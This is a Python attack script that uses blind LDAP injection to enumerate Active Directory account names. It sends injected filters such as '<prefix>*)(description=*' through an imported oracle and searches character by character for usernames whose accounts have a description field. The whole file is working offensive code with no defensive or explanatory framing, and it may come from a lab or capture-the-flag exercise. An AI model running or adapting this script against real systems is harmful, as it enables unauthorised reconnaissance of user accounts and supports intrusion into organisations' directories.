#!/usr/bin/env python3
"""
Enumerate sAMAccountName values of accounts that have a description, by BFS
over name prefixes using the injection oracle:

    <prefix>*)(description=*        -> True if any matching account has a desc
"""
import sys
import time

import pool_extract as P

P.init_pool()

CH = list("abcdefghijklmnopqrstuvwxyz0123456789._-")
MAXDEPTH = 14


def has_desc(prefix):
    return P.oracle(f"{prefix}*)(description=*")


def main():
    t0 = time.time()
    found = []
    frontier = [""]
    for depth in range(MAXDEPTH):
        nxt = []
        for p in frontier:
            for c in CH:
                cand = p + c
                if has_desc(cand):
                    nxt.append(cand)
                    print(f"  prefix {cand!r}  [{P.REQ[0]} req, {time.time()-t0:.0f}s]", flush=True)
        # a prefix is a complete username if no extension matched
        for p in frontier:
            exts = [p + c for c in CH if p + c in nxt]
            if not exts:
                found.append(p)
                print(f"  *** COMPLETE USERNAME WITH DESC: {p!r}", flush=True)
        frontier = nxt
        if not frontier:
            break
    print(f"\nusers with descriptions: {sorted(set(found))}", flush=True)
    print(f"requests: {P.REQ[0]}, {time.time()-t0:.0f}s", flush=True)


if __name__ == "__main__":
    main()
